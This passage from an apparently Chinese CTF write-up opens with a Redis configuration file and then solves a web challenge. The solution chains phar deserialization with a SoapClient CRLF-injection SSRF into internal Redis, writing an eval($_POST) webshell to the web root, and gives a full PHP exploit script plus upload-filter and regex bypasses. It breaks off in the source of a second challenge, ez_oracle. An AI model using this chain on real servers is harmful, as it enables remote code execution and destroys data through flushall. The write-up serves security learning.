EXPIRE command) must be deleted from memory. # 3) Because of a side effect of a command that stores data on a key that may # already exist. For example the RENAME command may delete the old key # content when it is replaced with another one. Similarly SUNIONSTORE # or SORT with STORE option may delete existing keys. The SET command # itself removes any old content of the specified key in order to replace # it with the specified string. # 4) During replication, when a replica performs a full resynchronization with # its master, the content of the whole database is removed in order to # load the RDB file just transferred. # # In all the above cases the default is to delete objects in a blocking way, # like if DEL was called. However you can configure each case specifically # in order to instead release memory in a non-blocking way like if UNLINK # was called, using the following configuration directives: lazyfree-lazy-eviction no lazyfree-lazy-expire no lazyfree-lazy-server-del no replica-lazy-flush no ############################## APPEND ONLY MODE ############################### # By default Redis asynchronously dumps the dataset on disk. This mode is # good enough in many applications, but an issue with the Redis process or # a power outage may result into a few minutes of writes lost (depending on # the configured save points). # # The Append Only File is an alternative persistence mode that provides # much better durability. For instance using the default data fsync policy # (see later in the config file) Redis can lose just one second of writes in a # dramatic event like a server power outage, or a single write if something # wrong with the Redis process itself happens, but the operating system is # still running correctly. # # AOF and RDB persistence can be enabled at the same time without problems. # If the AOF is enabled on startup Redis will load the AOF, that is the file # with the better durability guarantees. # # Please check http://redis.io/topics/persistence for more information. appendonly no # The name of the append only file (default: &quot;appendonly.aof&quot;) appendfilename &quot;appendonly.aof&quot; # The fsync() call tells the Operating System to actually write data on disk # instead of waiting for more data in the output buffer. Some OS will really flush # data on disk, some other OS will just try to do it ASAP. # # Redis supports three different modes: # # no: don&#x27;t fsync, just let the OS flush the data when it wants. Faster. # always: fsync after every write to the append only log. Slow, Safest. # everysec: fsync only one time every second. Compromise. # # The default is &quot;everysec&quot;, as that&#x27;s usually the right compromise between # speed and data safety. It&#x27;s up to you to understand if you can relax this to # &quot;no&quot; that will let the operating system flush the output buffer when # it wants, for better performances (but if you can live with the idea of # some data loss consider the default persistence mode that&#x27;s snapshotting), # or on the contrary, use &quot;always&quot; that&#x27;s very slow but a bit safer than # everysec. # # More details please check the following article: # http://antirez.com/post/redis-persistence-demystified.html # # If unsure, use &quot;everysec&quot;. # appendfsync always appendfsync everysec # appendfsync no # When the AOF fsync policy is set to always or everysec, and a background # saving process (a background save or AOF log background rewriting) is # performing a lot of I/O against the disk, in some Linux configurations # Redis may block too long on the fsync() call. Note that there is no fix for # this currently, as even performing fsync in a different thread will block # our synchronous write(2) call. # # In order to mitigate this problem it&#x27;s possible to use the following option # that will prevent fsync() from being called in the main process while a # BGSAVE or BGREWRITEAOF is in progress. # # This means that while another child is saving, the durability of Redis is # the same as &quot;appendfsync none&quot;. In practical terms, this means that it is # possible to lose up to 30 seconds of log in the worst scenario (with the # default Linux settings). # # If you have latency problems turn this to &quot;yes&quot;. Otherwise leave it as # &quot;no&quot; that is the safest pick from the point of view of durability. no-appendfsync-on-rewrite no # Automatic rewrite of the append only file. # Redis is able to automatically rewrite the log file implicitly calling # BGREWRITEAOF when the AOF log size grows by the specified percentage. # # This is how it works: Redis remembers the size of the AOF file after the # latest rewrite (if no rewrite has happened since the restart, the size of # the AOF at startup is used). # # This base size is compared to the current size. If the current size is # bigger than the specified percentage, the rewrite is triggered. Also # you need to specify a minimal size for the AOF file to be rewritten, this # is useful to avoid rewriting the AOF file even if the percentage increase # is reached but it is still pretty small. # # Specify a percentage of zero in order to disable the automatic AOF # rewrite feature. auto-aof-rewrite-percentage 100 auto-aof-rewrite-min-size 64mb # An AOF file may be found to be truncated at the end during the Redis # startup process, when the AOF data gets loaded back into memory. # This may happen when the system where Redis is running # crashes, especially when an ext4 filesystem is mounted without the # data=ordered option (however this can&#x27;t happen when Redis itself # crashes or aborts but the operating system still works correctly). # # Redis can either exit with an error when this happens, or load as much # data as possible (the default now) and start if the AOF file is found # to be truncated at the end. The following option controls this behavior. # # If aof-load-truncated is set to yes, a truncated AOF file is loaded and # the Redis server starts emitting a log to inform the user of the event. # Otherwise if the option is set to no, the server aborts with an error # and refuses to start. When the option is set to no, the user requires # to fix the AOF file using the &quot;redis-check-aof&quot; utility before to restart # the server. # # Note that if the AOF file will be found to be corrupted in the middle # the server will still exit with an error. This option only applies when # Redis will try to read more data from the AOF file but not enough bytes # will be found. aof-load-truncated yes # When rewriting the AOF file, Redis is able to use an RDB preamble in the # AOF file for faster rewrites and recoveries. When this option is turned # on the rewritten AOF file is composed of two different stanzas: # # [RDB file][AOF tail] # # When loading Redis recognizes that the AOF file starts with the &quot;REDIS&quot; # string and loads the prefixed RDB file, and continues loading the AOF # tail. aof-use-rdb-preamble yes ################################ LUA SCRIPTING ############################### # Max execution time of a Lua script in milliseconds. # # If the maximum execution time is reached Redis will log that a script is # still in execution after the maximum allowed time and will start to # reply to queries with an error. # # When a long running script exceeds the maximum execution time only the # SCRIPT KILL and SHUTDOWN NOSAVE commands are available. The first can be # used to stop a script that did not yet called write commands. The second # is the only way to shut down the server in the case a write command was # already issued by the script but the user doesn&#x27;t want to wait for the natural # termination of the script. # # Set it to 0 or a negative value for unlimited execution without warnings. lua-time-limit 5000 ################################ REDIS CLUSTER ############################### # Normal Redis instances can&#x27;t be part of a Redis Cluster; only nodes that are # started as cluster nodes can. In order to start a Redis instance as a # cluster node enable the cluster support uncommenting the following: # # cluster-enabled yes # Every cluster node has a cluster configuration file. This file is not # intended to be edited by hand. It is created and updated by Redis nodes. # Every Redis Cluster node requires a different cluster configuration file. # Make sure that instances running in the same system do not have # overlapping cluster configuration file names. # # cluster-config-file nodes-6379.conf # Cluster node timeout is the amount of milliseconds a node must be unreachable # for it to be considered in failure state. # Most other internal time limits are multiple of the node timeout. # # cluster-node-timeout 15000 # A replica of a failing master will avoid to start a failover if its data # looks too old. # # There is no simple way for a replica to actually have an exact measure of # its &quot;data age&quot;, so the following two checks are performed: # # 1) If there are multiple replicas able to failover, they exchange messages # in order to try to give an advantage to the replica with the best # replication offset (more data from the master processed). # Replicas will try to get their rank by offset, and apply to the start # of the failover a delay proportional to their rank. # # 2) Every single replica computes the time of the last interaction with # its master. This can be the last ping or command received (if the master # is still in the &quot;connected&quot; state), or the time that elapsed since the # disconnection with the master (if the replication link is currently down). # If the last interaction is too old, the replica will not try to failover # at all. # # The point &quot;2&quot; can be tuned by user. Specifically a replica will not perform # the failover if, since the last interaction with the master, the time # elapsed is greater than: # # (node-timeout * replica-validity-factor) + repl-ping-replica-period # # So for example if node-timeout is 30 seconds, and the replica-validity-factor # is 10, and assuming a default repl-ping-replica-period of 10 seconds, the # replica will not try to failover if it was not able to talk with the master # for longer than 310 seconds. # # A large replica-validity-factor may allow replicas with too old data to failover # a master, while a too small value may prevent the cluster from being able to # elect a replica at all. # # For maximum availability, it is possible to set the replica-validity-factor # to a value of 0, which means, that replicas will always try to failover the # master regardless of the last time they interacted with the master. # (However they&#x27;ll always try to apply a delay proportional to their # offset rank). # # Zero is the only value able to guarantee that when all the partitions heal # the cluster will always be able to continue. # # cluster-replica-validity-factor 10 # Cluster replicas are able to migrate to orphaned masters, that are masters # that are left without working replicas. This improves the cluster ability # to resist to failures as otherwise an orphaned master can&#x27;t be failed over # in case of failure if it has no working replicas. # # Replicas migrate to orphaned masters only if there are still at least a # given number of other working replicas for their old master. This number # is the &quot;migration barrier&quot;. A migration barrier of 1 means that a replica # will migrate only if there is at least 1 other working replica for its master # and so forth. It usually reflects the number of replicas you want for every # master in your cluster. # # Default is 1 (replicas migrate only if their masters remain with at least # one replica). To disable migration just set it to a very large value. # A value of 0 can be set but is useful only for debugging and dangerous # in production. # # cluster-migration-barrier 1 # By default Redis Cluster nodes stop accepting queries if they detect there # is at least an hash slot uncovered (no available node is serving it). # This way if the cluster is partially down (for example a range of hash slots # are no longer covered) all the cluster becomes, eventually, unavailable. # It automatically returns available as soon as all the slots are covered again. # # However sometimes you want the subset of the cluster which is working, # to continue to accept queries for the part of the key space that is still # covered. In order to do so, just set the cluster-require-full-coverage # option to no. # # cluster-require-full-coverage yes # This option, when set to yes, prevents replicas from trying to failover its # master during master failures. However the master can still perform a # manual failover, if forced to do so. # # This is useful in different scenarios, especially in the case of multiple # data center operations, where we want one side to never be promoted if not # in the case of a total DC failure. # # cluster-replica-no-failover no # In order to setup your cluster make sure to read the documentation # available at http://redis.io web site. ########################## CLUSTER DOCKER/NAT support ######################## # In certain deployments, Redis Cluster nodes address discovery fails, because # addresses are NAT-ted or because ports are forwarded (the typical case is # Docker and other containers). # # In order to make Redis Cluster working in such environments, a static # configuration where each node knows its public address is needed. The # following two options are used for this scope, and are: # # * cluster-announce-ip # * cluster-announce-port # * cluster-announce-bus-port # # Each instruct the node about its address, client port, and cluster message # bus port. The information is then published in the header of the bus packets # so that other nodes will be able to correctly map the address of the node # publishing the information. # # If the above options are not used, the normal Redis Cluster auto-detection # will be used instead. # # Note that when remapped, the bus port may not be at the fixed offset of # clients port + 10000, so you can specify any port and bus-port depending # on how they get remapped. If the bus-port is not set, a fixed offset of # 10000 will be used as usually. # # Example: # # cluster-announce-ip 10.1.1.5 # cluster-announce-port 6379 # cluster-announce-bus-port 6380 ################################## SLOW LOG ################################### # The Redis Slow Log is a system to log queries that exceeded a specified # execution time. The execution time does not include the I/O operations # like talking with the client, sending the reply and so forth, # but just the time needed to actually execute the command (this is the only # stage of command execution where the thread is blocked and can not serve # other requests in the meantime). # # You can configure the slow log with two parameters: one tells Redis # what is the execution time, in microseconds, to exceed in order for the # command to get logged, and the other parameter is the length of the # slow log. When a new command is logged the oldest one is removed from the # queue of logged commands. # The following time is expressed in microseconds, so 1000000 is equivalent # to one second. Note that a negative number disables the slow log, while # a value of zero forces the logging of every command. slowlog-log-slower-than 10000 # There is no limit to this length. Just be aware that it will consume memory. # You can reclaim memory used by the slow log with SLOWLOG RESET. slowlog-max-len 128 ################################ LATENCY MONITOR ############################## # The Redis latency monitoring subsystem samples different operations # at runtime in order to collect data related to possible sources of # latency of a Redis instance. # # Via the LATENCY command this information is available to the user that can # print graphs and obtain reports. # # The system only logs operations that were performed in a time equal or # greater than the amount of milliseconds specified via the # latency-monitor-threshold configuration directive. When its value is set # to zero, the latency monitor is turned off. # # By default latency monitoring is disabled since it is mostly not needed # if you don&#x27;t have latency issues, and collecting data has a performance # impact, that while very small, can be measured under big load. Latency # monitoring can easily be enabled at runtime using the command # &quot;CONFIG SET latency-monitor-threshold &quot; if needed. latency-monitor-threshold 0 ############################# EVENT NOTIFICATION ############################## # Redis can notify Pub/Sub clients about events happening in the key space. # This feature is documented at http://redis.io/topics/notifications # # For instance if keyspace events notification is enabled, and a client # performs a DEL operation on key &quot;foo&quot; stored in the Database 0, two # messages will be published via Pub/Sub: # # PUBLISH __keyspace@0__:foo del # PUBLISH __keyevent@0__:del foo # # It is possible to select the events that Redis will notify among a set # of classes. Every class is identified by a single character: # # K Keyspace events, published with __keyspace@__ prefix. # E Keyevent events, published with __keyevent@__ prefix. # g Generic commands (non-type specific) like DEL, EXPIRE, RENAME, ... # $ String commands # l List commands # s Set commands # h Hash commands # z Sorted set commands # x Expired events (events generated every time a key expires) # e Evicted events (events generated when a key is evicted for maxmemory) # A Alias for g$lshzxe, so that the &quot;AKE&quot; string means all the events. # # The &quot;notify-keyspace-events&quot; takes as argument a string that is composed # of zero or multiple characters. The empty string means that notifications # are disabled. # # Example: to enable list and generic events, from the point of view of the # event name, use: # # notify-keyspace-events Elg # # Example 2: to get the stream of the expired keys subscribing to channel # name __keyevent@0__:expired use: # # notify-keyspace-events Ex # # By default all notifications are disabled because most users don&#x27;t need # this feature and the feature has some overhead. Note that if you don&#x27;t # specify at least one of K or E, no events will be delivered. notify-keyspace-events &quot;&quot; ############################### ADVANCED CONFIG ############################### # Hashes are encoded using a memory efficient data structure when they have a # small number of entries, and the biggest entry does not exceed a given # threshold. These thresholds can be configured using the following directives. hash-max-ziplist-entries 512 hash-max-ziplist-value 64 # Lists are also encoded in a special way to save a lot of space. # The number of entries allowed per internal list node can be specified # as a fixed maximum size or a maximum number of elements. # For a fixed maximum size, use -5 through -1, meaning: # -5: max size: 64 Kb &lt;-- not recommended for normal workloads # -4: max size: 32 Kb &lt;-- not recommended # -3: max size: 16 Kb &lt;-- probably not recommended # -2: max size: 8 Kb &lt;-- good # -1: max size: 4 Kb &lt;-- good # Positive numbers mean store up to _exactly_ that number of elements # per list node. # The highest performing option is usually -2 (8 Kb size) or -1 (4 Kb size), # but if your use case is unique, adjust the settings as necessary. list-max-ziplist-size -2 # Lists may also be compressed. # Compress depth is the number of quicklist ziplist nodes from *each* side of # the list to *exclude* from compression. The head and tail of the list # are always uncompressed for fast push/pop operations. Settings are: # 0: disable all list compression # 1: depth 1 means &quot;don&#x27;t start compressing until after 1 node into the list, # going from either the head or tail&quot; # So: [head]-&gt;node-&gt;node-&gt;...-&gt;node-&gt;[tail] # [head], [tail] will always be uncompressed; inner nodes will compress. # 2: [head]-&gt;[next]-&gt;node-&gt;node-&gt;...-&gt;node-&gt;[prev]-&gt;[tail] # 2 here means: don&#x27;t compress head or head-&gt;next or tail-&gt;prev or tail, # but compress all nodes between them. # 3: [head]-&gt;[next]-&gt;[next]-&gt;node-&gt;node-&gt;...-&gt;node-&gt;[prev]-&gt;[prev]-&gt;[tail] # etc. list-compress-depth 0 # Sets have a special encoding in just one case: when a set is composed # of just strings that happen to be integers in radix 10 in the range # of 64 bit signed integers. # The following configuration setting sets the limit in the size of the # set in order to use this special memory saving encoding. set-max-intset-entries 512 # Similarly to hashes and lists, sorted sets are also specially encoded in # order to save a lot of space. This encoding is only used when the length and # elements of a sorted set are below the following limits: zset-max-ziplist-entries 128 zset-max-ziplist-value 64 # HyperLogLog sparse representation bytes limit. The limit includes the # 16 bytes header. When an HyperLogLog using the sparse representation crosses # this limit, it is converted into the dense representation. # # A value greater than 16000 is totally useless, since at that point the # dense representation is more memory efficient. # # The suggested value is ~ 3000 in order to have the benefits of # the space efficient encoding without slowing down too much PFADD, # which is O(N) with the sparse encoding. The value can be raised to # ~ 10000 when CPU is not a concern, but space is, and the data set is # composed of many HyperLogLogs with cardinality in the 0 - 15000 range. hll-sparse-max-bytes 3000 # Streams macro node max size / items. The stream data structure is a radix # tree of big nodes that encode multiple items inside. Using this configuration # it is possible to configure how big a single node can be in bytes, and the # maximum number of items it may contain before switching to a new node when # appending new stream entries. If any of the following settings are set to # zero, the limit is ignored, so for instance it is possible to set just a # max entires limit by setting max-bytes to 0 and max-entries to the desired # value. stream-node-max-bytes 4096 stream-node-max-entries 100 # Active rehashing uses 1 millisecond every 100 milliseconds of CPU time in # order to help rehashing the main Redis hash table (the one mapping top-level # keys to values). The hash table implementation Redis uses (see dict.c) # performs a lazy rehashing: the more operation you run into a hash table # that is rehashing, the more rehashing &quot;steps&quot; are performed, so if the # server is idle the rehashing is never complete and some more memory is used # by the hash table. # # The default is to use this millisecond 10 times every second in order to # actively rehash the main dictionaries, freeing memory when possible. # # If unsure: # use &quot;activerehashing no&quot; if you have hard latency requirements and it is # not a good thing in your environment that Redis can reply from time to time # to queries with 2 milliseconds delay. # # use &quot;activerehashing yes&quot; if you don&#x27;t have such hard requirements but # want to free memory asap when possible. activerehashing yes # The client output buffer limits can be used to force disconnection of clients # that are not reading data from the server fast enough for some reason (a # common reason is that a Pub/Sub client can&#x27;t consume messages as fast as the # publisher can produce them). # # The limit can be set differently for the three different classes of clients: # # normal -&gt; normal clients including MONITOR clients # replica -&gt; replica clients # pubsub -&gt; clients subscribed to at least one pubsub channel or pattern # # The syntax of every client-output-buffer-limit directive is the following: # # client-output-buffer-limit # # A client is immediately disconnected once the hard limit is reached, or if # the soft limit is reached and remains reached for the specified number of # seconds (continuously). # So for instance if the hard limit is 32 megabytes and the soft limit is # 16 megabytes / 10 seconds, the client will get disconnected immediately # if the size of the output buffers reach 32 megabytes, but will also get # disconnected if the client reaches 16 megabytes and continuously overcomes # the limit for 10 seconds. # # By default normal clients are not limited because they don&#x27;t receive data # without asking (in a push way), but just after a request, so only # asynchronous clients may create a scenario where data is requested faster # than it can read. # # Instead there is a default limit for pubsub and replica clients, since # subscribers and replicas receive data in a push fashion. # # Both the hard or the soft limit can be disabled by setting them to zero. client-output-buffer-limit normal 0 0 0 client-output-buffer-limit replica 256mb 64mb 60 client-output-buffer-limit pubsub 32mb 8mb 60 # Client query buffers accumulate new commands. They are limited to a fixed # amount by default in order to avoid that a protocol desynchronization (for # instance due to a bug in the client) will lead to unbound memory usage in # the query buffer. However you can configure it here if you have very special # needs, such us huge multi/exec requests or alike. # # client-query-buffer-limit 1gb # In the Redis protocol, bulk requests, that are, elements representing single # strings, are normally limited ot 512 mb. However you can change this limit # here. # # proto-max-bulk-len 512mb # Redis calls an internal function to perform many background tasks, like # closing connections of clients in timeout, purging expired keys that are # never requested, and so forth. # # Not all tasks are performed with the same frequency, but Redis checks for # tasks to perform according to the specified &quot;hz&quot; value. # # By default &quot;hz&quot; is set to 10. Raising the value will use more CPU when # Redis is idle, but at the same time will make Redis more responsive when # there are many keys expiring at the same time, and timeouts may be # handled with more precision. # # The range is between 1 and 500, however a value over 100 is usually not # a good idea. Most users should use the default of 10 and raise this up to # 100 only in environments where very low latency is required. hz 10 # Normally it is useful to have an HZ value which is proportional to the # number of clients connected. This is useful in order, for instance, to # avoid too many clients are processed for each background task invocation # in order to avoid latency spikes. # # Since the default HZ value by default is conservatively set to 10, Redis # offers, and enables by default, the ability to use an adaptive HZ value # which will temporary raise when there are many connected clients. # # When dynamic HZ is enabled, the actual configured HZ will be used as # as a baseline, but multiples of the configured HZ value will be actually # used as needed once more clients are connected. In this way an idle # instance will use very little CPU time while a busy instance will be # more responsive. dynamic-hz yes # When a child rewrites the AOF file, if the following option is enabled # the file will be fsync-ed every 32 MB of data generated. This is useful # in order to commit the file to the disk more incrementally and avoid # big latency spikes. aof-rewrite-incremental-fsync yes # When redis saves RDB file, if the following option is enabled # the file will be fsync-ed every 32 MB of data generated. This is useful # in order to commit the file to the disk more incrementally and avoid # big latency spikes. rdb-save-incremental-fsync yes # Redis LFU eviction (see maxmemory setting) can be tuned. However it is a good # idea to start with the default settings and only change them after investigating # how to improve the performances and how the keys LFU change over time, which # is possible to inspect via the OBJECT FREQ command. # # There are two tunable parameters in the Redis LFU implementation: the # counter logarithm factor and the counter decay time. It is important to # understand what the two parameters mean before changing them. # # The LFU counter is just 8 bits per key, it&#x27;s maximum value is 255, so Redis # uses a probabilistic increment with logarithmic behavior. Given the value # of the old counter, when a key is accessed, the counter is incremented in # this way: # # 1. A random number R between 0 and 1 is extracted. # 2. A probability P is calculated as 1/(old_value*lfu_log_factor+1). # 3. The counter is incremented only if R &lt; P. # # The default lfu-log-factor is 10. This is a table of how the frequency # counter changes with a different number of accesses with different # logarithmic factors: # # +--------+------------+------------+------------+------------+------------+ # | factor | 100 hits | 1000 hits | 100K hits | 1M hits | 10M hits | # +--------+------------+------------+------------+------------+------------+ # | 0 | 104 | 255 | 255 | 255 | 255 | # +--------+------------+------------+------------+------------+------------+ # | 1 | 18 | 49 | 255 | 255 | 255 | # +--------+------------+------------+------------+------------+------------+ # | 10 | 10 | 18 | 142 | 255 | 255 | # +--------+------------+------------+------------+------------+------------+ # | 100 | 8 | 11 | 49 | 143 | 255 | # +--------+------------+------------+------------+------------+------------+ # # NOTE: The above table was obtained by running the following commands: # # redis-benchmark -n 1000000 incr foo # redis-cli object freq foo # # NOTE 2: The counter initial value is 5 in order to give new objects a chance # to accumulate hits. # # The counter decay time is the time, in minutes, that must elapse in order # for the key counter to be divided by two (or decremented if it has a value # less &lt;= 10). # # The default value for the lfu-decay-time is 1. A Special value of 0 means to # decay the counter every time it happens to be scanned. # # lfu-log-factor 10 # lfu-decay-time 1 ########################### ACTIVE DEFRAGMENTATION ####################### # # WARNING THIS FEATURE IS EXPERIMENTAL. However it was stress tested # even in production and manually tested by multiple engineers for some # time. # # What is active defragmentation? # ------------------------------- # # Active (online) defragmentation allows a Redis server to compact the # spaces left between small allocations and deallocations of data in memory, # thus allowing to reclaim back memory. # # Fragmentation is a natural process that happens with every allocator (but # less so with Jemalloc, fortunately) and certain workloads. Normally a server # restart is needed in order to lower the fragmentation, or at least to flush # away all the data and create it again. However thanks to this feature # implemented by Oran Agra for Redis 4.0 this process can happen at runtime # in an &quot;hot&quot; way, while the server is running. # # Basically when the fragmentation is over a certain level (see the # configuration options below) Redis will start to create new copies of the # values in contiguous memory regions by exploiting certain specific Jemalloc # features (in order to understand if an allocation is causing fragmentation # and to allocate it in a better place), and at the same time, will release the # old copies of the data. This process, repeated incrementally for all the keys # will cause the fragmentation to drop back to normal values. # # Important things to understand: # # 1. This feature is disabled by default, and only works if you compiled Redis # to use the copy of Jemalloc we ship with the source code of Redis. # This is the default with Linux builds. # # 2. You never need to enable this feature if you don&#x27;t have fragmentation # issues. # # 3. Once you experience fragmentation, you can enable this feature when # needed with the command &quot;CONFIG SET activedefrag yes&quot;. # # The configuration parameters are able to fine tune the behavior of the # defragmentation process. If you are not sure about what they mean it is # a good idea to leave the defaults untouched. # Enabled active defragmentation # activedefrag yes # Minimum amount of fragmentation waste to start active defrag # active-defrag-ignore-bytes 100mb # Minimum percentage of fragmentation to start active defrag # active-defrag-threshold-lower 10 # Maximum percentage of fragmentation at which we use maximum effort # active-defrag-threshold-upper 100 # Minimal effort for defrag in CPU percentage # active-defrag-cycle-min 5 # Maximal effort for defrag in CPU percentage # active-defrag-cycle-max 75 # Maximum number of set/hash/zset/list fields that will be processed from # the main dictionary scan # active-defrag-max-scan-fields 1000</span><br></pre></td></tr></table></figure><p>htaccess.txt</p><p><img src="../images/image-20231205195827272.png" alt="image-20231205195827272"></p><p>一共就是这些信息</p><p>分析一下源码  发现没有反序列化入口  然后就猜测是用phar来打  然后题目又给了redis和这个htaccess我们就猜测是不是写webshell 并且不能使用php后缀  </p><p><img src="../images/image-20231205200108706.png" alt="image-20231205200108706"></p><p>因为不知道咋样才能把我们的链子连一起  然后发现了这个check可控  就想到用soap原生链子来打  调用不存在的方法触发call函数来ssrf给内网的redis写马</p><p>所以最终payload  (注意写马的时候并不是未授权登录  在给的redis.conf中  存在这个默认的密码)</p><p><img src="../images/image-20231205200411786.png" alt="image-20231205200411786"></p><p>想完这些后  突然发现存在这个waf </p><p><img src="../images/image-20231205200546624.png" alt="image-20231205200546624"></p><p>第一个就是对文件内容进行检测  检测<code>&lt;?php</code>关键字  但是呢 在phar中  是可以不需要这个前缀的  直接<code>__HALT_COMPILER();?&gt;</code>这样就行了   然后下面的getimagesize就更加简单了  使用<code>GIF89a</code>等等都可以进行绕过</p><p>那么我们的链子就全部构造完成了  借用xz师傅的链子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test_upload</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">check</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;auth 574c941c5987232d337276764d3413c4\r\nconfig set dir /var/www/html/\r\nconfig set dbfilename test123.wupco\r\nflushall\r\nappend test &#x27;&lt;&#x27;\r\nappend test &#x27;?=eval(\$_POST[1]);?&gt;&#x27;\r\nsave&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1:6379/&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;user_agent&quot;</span>=&gt;<span class="string">&quot;test\r\n&quot;</span>.<span class="variable">$cmd</span>.<span class="string">&quot;\r\n&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test_upload</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;check = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;filename = <span class="string">&#x27;123.jpg&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>,<span class="number">0</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89A&#x27;</span>.<span class="string">&quot;\n&quot;</span>.<span class="string">&#x27;__HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;text.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里注意的是redis写马使用的是append  并不是set</p><p>(原因就是因为我们在写webshell的时候 set用的是整个webshell <code>&lt;?=xx</code>这些  <code>&lt;?=</code>会被正则匹配到  但是append的话就不会  因为我们先写入<code>&lt;</code>   然后再写入<code>?=xxx</code>就能绕过正则了)  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flushall:   清空 Redis 的所有数据，以确保没有冲突或残留数据。</span><br><span class="line"></span><br><span class="line">append test &#x27;&lt;&#x27;: 在 Redis 键名为 test 的字符串值末尾追加字符 &#x27;&lt;&#x27;。</span><br><span class="line"></span><br><span class="line">append test &#x27;?=eval(\$_POST[1]);?&gt;&#x27;:在 Redis 键名为 test 的字符串值末尾追加 PHP 代码 ?=eval(\$_POST[1]);?&gt;，其中 $_POST[1] 表示从 POST 请求中获取的第一个参数。攻击者试图将 PHP 代码插入 Redis 中，以在服务器上执行任意 PHP 代码。</span><br></pre></td></tr></table></figure><p>其实这里的绕过方式还有这种</p><p><img src="../images/image-20231206103945003.png" alt="image-20231206103945003"></p><p>在这个redis 6.X版本中  会<code>&lt;\?</code>会被解析成<code>&lt;?</code>还是能绕过过滤</p><h2 id="ez-oracle"><a href="#ez-oracle" class="headerlink" title="ez_oracle"></a>ez_oracle</h2><p>参考文章 <a href="https://exp10it.cn/2023/12/2023-%E4%BA%AC%E9%BA%92-ctf-ez_oracle-writeup/#ez_oracle">https://exp10it.cn/2023/12/2023-%E4%BA%AC%E9%BA%92-ctf-ez_oracle-writeup/#ez_oracle</a></p><p>源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">import logging</span><br><span class="line"></span><br><span class="line">import oracledb</span><br><span class="line">from flask import Flask, request</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">username = &quot;system&quot;</span><br><span class="line">password = &quot;PaAasSSsSwoRrRDd&quot;</span><br><span class="line">ol_server = &quot;127.0.0.1&quot;</span><br><span class="line">ol_port = 1521</span><br><span class="line">sid = &quot;orcl&quot;</span><br><span class="line">dsn = &quot;&#123;&#125;:&#123;&#125;/&#123;&#125;&quot;.format(ol_server, 